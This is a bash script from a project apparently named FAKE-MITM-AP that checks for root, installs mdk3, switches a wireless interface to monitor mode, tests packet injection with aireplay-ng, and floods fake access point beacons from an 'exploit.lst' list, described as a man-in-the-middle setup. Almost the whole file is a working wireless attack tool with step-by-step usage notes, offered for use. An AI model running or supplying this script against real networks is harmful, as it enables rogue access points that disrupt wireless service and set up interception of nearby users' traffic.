#!/bin/bash

# Abort if its not running on root
   echo "Checking if you are running this script on su mode or not"
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root"
   sleep 1
   exit
else 
   sleep 2
fi

# Abort if its not running on linux
   echo "Checking if you are running this script on linux or not"
if [[ $(uname -s) != "Linux" ]]; then
   echo "This script must be run on linux"
   sleep 1
   exit
else 
   sleep 2
fi

# Install MDK3 to run this tool

sudo apt install mdk3

# Check if packet injection is working or not on interface 0/1
echo "Select the correct interface to test packet-injection ! (0/1)"
read -r answer
if [[ $answer == 0 ]]; then
   echo "Injecting packets on interface 0"
   ifconfig wlan0 down;
   iwconfig wlan0 mode monitor;
   ifconfig wlan0 up;
   iwconfig wlan0;
   echo "Injecting packets on interface 0"
   aireplay-ng --test wlan0
   echo "Packet injection test done on interface 0 and its working fine"
else 
   echo "Injecting packets on interface 1"
   ifconfig wlan1 down;
   iwconfig wlan1 mode monitor;
   ifconfig wlan1 up;
   iwconfig wlan1;
   echo "Injecting packets on interface 1"
   aireplay-ng --test wlan1
   echo "Packet injection test done on interface 1 and its working fine"
fi

# Run the MDK3 tool to create MITM AP using our created file.lst file (select the correct interface/wlan0/wlan1)
echo "Select the correct interface to create FAKE_AP ! (0/1)"
read -r answer
if [[ $answer == 0 ]]; then
   echo "Creating fake AP on interface 0"
   mdk3 wlan0 b -c 1 -f exploit.lst
   echo "Fake AP created on interface 0"
else
    echo "Creating fake AP on interface 1"
    mdk3 wlan1 b -c 1 -f exploit.lst
    echo "Fake AP created on interface 1"
fi

##
## LICENSE: GPL-3.0-or-later
## Author: KARTHIK LAL
## Copyright (C) 2022 KARTHIK LAL
## This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
## MITM ATTACK is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
## You should have received a copy of the GNU General Public License along with this program. If not, see <http://www.gnu.org/licenses/>.
##
# PROJECT LICENSE ( @karthik558/FAKE-MITM-AP/LICENSE )
##
## HOW TO USE THIS SCRIPT
## 1. Clone the script from github
## 2. Run the script with ./start.sh
## 3. You will be asked to select the correct interface to create fake AP (0/1) and to select the correct interface to test packet-injection (0/1)
## 4. You can edit the exploit.sh file and edit those variables to your liking
## 5. Thats it!
##
